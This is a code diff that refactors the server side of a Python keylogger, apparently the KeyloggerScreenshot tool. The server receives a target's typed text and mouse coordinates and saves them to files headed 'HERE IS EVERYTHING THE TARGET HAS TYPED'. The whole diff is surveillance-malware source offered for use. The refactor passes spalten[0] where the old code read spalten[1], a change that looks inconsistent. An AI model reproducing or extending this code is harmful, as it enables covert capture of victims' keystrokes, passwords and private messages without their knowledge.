@@ -19,6 +19,29 @@ class ServerKeylogger:
         self.full_msg = None
         self.cord = None
 
+    def do_file(self, spalten):
+        if spalten != "":
+            # If the data is not empty
+            text = spalten
+            for zeichen in text:
+                if "{" == zeichen:
+                    text = text.replace("{", " ")
+            bp.color(f"Text of target: {text}", "magenta")
+            zeit = time.strftime("%H-%M-%S-%Y")
+            # This is the time the data has arrived
+            with open(f"Keylogger of the target Time {zeit}.txt", "a+", encoding="utf-8") as file:
+                file.write(f"HERE IS EVERYTHING THE TARGET HAS TYPED \n\n{text}")
+                # That means data will appear even if the connection isn't stabled
+        else:
+            bp.color("The target hasn't written something in the meanwhile", "magenta")
+
+    @staticmethod
+    def terminator():
+        bp.color("\nTHE CONNECTION HAS BEEN INTERRUPTED", "magenta")
+        bp.color("THE SERVER WILL BE DESTROYED\n", "magenta")
+        bp.color("TO RUN A SIMULATION RUN THE 'Simulation_code.py' SCRIPT\nIF YOU DONT HAVE ONE YOU CAN CREATE IT ON GITHUB\nALL THE INSTRUCTIONS ARE THERE: https://github.com/Kill0ger/KeyloggerScreenshot\n\nTHANK YOU FOR USING KEYLOGGERSCREENSHOT","magenta")
+        os._exit(0)
+
     def message(self, real_data):
         # To know if the server has some issues
         for zeichen in real_data:
@@ -70,21 +93,7 @@ class ServerKeylogger:
                     self.new_cor = "[(" + self.full_msg.split("[(")[1]
                     spalten = self.full_msg.split("[(")[0].split("***%§§)§§%")
                     # This splits the data with the special code
-                    if spalten[1] != "":
-                        # If the data is not empty
-                        text = spalten[1]
-                        for zeichen in text:
-                            if "{" == zeichen:
-                                text = text.replace("{", " ")
-                        bp.color(f"Text of target: {text}", "magenta")
-                        zeit = time.strftime("%H-%M-%S-%Y")
-                        # This is the time the data has arrived
-                        with open(f"Keylogger of the target Time {zeit}.txt", "a+", encoding="utf-8") as file:
-                            file.write(f"HERE IS EVERYTHING THE TARGET HAS TYPED \n\n{text}")
-                            # That means data will appear even if the connection isn't stabled
-                    else:
-                        bp.color("The target hasn't written something in the meanwhile", "magenta")
-
+                    self.do_file(spalten[0])
 
                 else:
                     # Checks if the coordinates are there
@@ -98,11 +107,7 @@ class ServerKeylogger:
                 bp.color("The coordinates of the target have been saved to your directory", "magenta")
 
                 if "***%§§)§§%" in self.full_msg:
-
-                    bp.color("\nTHE CONNECTION HAS BEEN INTERRUPTED", "magenta")
-                    bp.color("THE SERVER WILL BE DESTROYED\n", "magenta")
-                    bp.color("TO RUN A SIMULATION RUN THE 'Simulation_code.py' SCRIPT\nIF YOU DONT HAVE ONE YOU CAN CREATE IT ON GITHUB\nALL THE INSTRUCTIONS ARE THERE: https://github.com/Kill0ger/KeyloggerScreenshot\n\nTHANK YOU FOR USING KEYLOGGERSCREENSHOT", "magenta")
-                    os._exit(0)
+                    ServerKeylogger.terminator()
 
                 if self.cord is not None:
                     if self.cord[1] == "":
@@ -120,7 +125,10 @@ class ServerKeylogger:
                 # Checks if nothing has typed or clicked
                 bp.color("The target hasn't typed and clicked anything", "magenta")
                 # This shuts down the server
-
+            else:
+                self.do_file(self.full_msg.split("***%§§)§§%")[1])
+                ServerKeylogger.terminator()
+                
             if self.simulater is True:
                 print("Simulation will come in 10 seconds!!!")
                 time.sleep(10)
